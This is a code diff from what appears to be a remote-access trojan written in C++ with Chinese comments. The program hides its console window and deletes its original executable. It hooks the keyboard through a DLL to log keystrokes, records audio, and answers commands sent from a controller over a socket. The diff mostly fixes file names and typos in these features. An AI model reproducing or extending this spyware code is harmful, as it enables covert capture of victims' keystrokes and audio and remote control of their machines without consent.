@@ -19,7 +19,7 @@ using namespace cv;
 #define DATA_BUFMID 2000
 #define IP_PORT 9999
 #define IP_ADDR "127.0.0.1"
-//#define DEBUG
+#define DEBUG
 #ifndef DEBUG
 #pragma comment(linker,"/subsystem:\"windows\" /entry:\"mainCRTStartup\"")
 #endif // !DEBUG
@@ -45,7 +45,7 @@ pthread_t KeyBoardProc;
 pthread_t TapeProc;
 // HOOK键盘技术
 void* Hook_Keyboard(void *arg) {
-    HMODULE hModule = LoadLibrary(TEXT("A:\\Project\\c\\hook_keyboard\\x64\\Release\\hook_keyboard.dll"));
+    HMODULE hModule = LoadLibrary(TEXT("hook_keyboard.dll"));
     if (hModule == NULL) { 
 #ifdef DEBUG
         printf("获取DLL失败\n");
@@ -168,7 +168,7 @@ int main(int argc,char* argv[]) {
         CloseHandle(hProcessOrig);
         DeleteFile(argv[2]);
 #ifdef DEBUG
-        printf("将清理 %s 盘\n", argv[2]);
+        printf("将清理 %s\n", argv[2]);
 #endif
 #ifndef DEBUG
         char cmd[50] = { 0 };
@@ -192,7 +192,7 @@ int main(int argc,char* argv[]) {
             pthread_create(&KeyBoardProc, NULL, Hook_Keyboard, NULL);
             pthread_detach(KeyBoardProc);
         }
-        if (fopen("Tape", "r") == NULL) {
+        if (fopen("Tape.txt", "r") == NULL) {
 #ifdef DEBUG
             printf("[OFF]录音");
 #endif
@@ -463,24 +463,24 @@ int main(int argc,char* argv[]) {
             }
             else if (strcmp(GetInfoStructure->Type, "S") == 0) {
                 if (strcmp(GetInfoStructure->Info, "FUCK") == 0) break;
-                else if (strcmp(GetInfoStructure->Info, "keyborad") == 0) {
-                    if (fopen("keyboard.txt", "rb") == NULL) {
-                        fopen("keyboard.txt", "a");
+                else if (strcmp(GetInfoStructure->Info, "keyboard") == 0) {
+                    if (fopen("KeyBoardLog.txt", "rb") == NULL) {
+                        fopen("KeyBoardLog.txt", "a");
                         sprintf(SendInfoStructure.Info, "HOOK KeyBoard 已设置为开启 ");
                     }
                     else {
                         sprintf(SendInfoStructure.Info, "HOOK KeyBoard 已设置为关闭 ");
-                        remove("keyboard.txt");
+                        remove("KeyBoardLog.txt");
                     }
                     strcat(SendInfoStructure.Info, "重启生效");
                 }
                 else if (strcmp(GetInfoStructure->Info, "tape") == 0) {
-                    if (fopen("tape.txt", "rb") == NULL) {
+                    if (fopen("Tape.txt", "r") == NULL) {
                         fopen("tape.txt", "a");
                         sprintf(SendInfoStructure.Info, "录音 已设置为开启 ");
                     }
                     else {
-                        remove("taoe.txt");
+                        remove("Tape.txt");
                         sprintf(SendInfoStructure.Info, "录音 已设置为关闭 ");
                     }
                     strcat(SendInfoStructure.Info, "重启生效");
@@ -529,7 +529,7 @@ int main(int argc,char* argv[]) {
                         CloseHandle(pi.hThread);
                     }
                 }
-                else if (strcmp(GetInfoStructure->Info, "KISS") == 0) {
+                else if (strcmp(GetInfoStructure->Info, "KILL") == 0) {
 #ifdef DEBUG
                     printf("结束程序\n");
 #endif
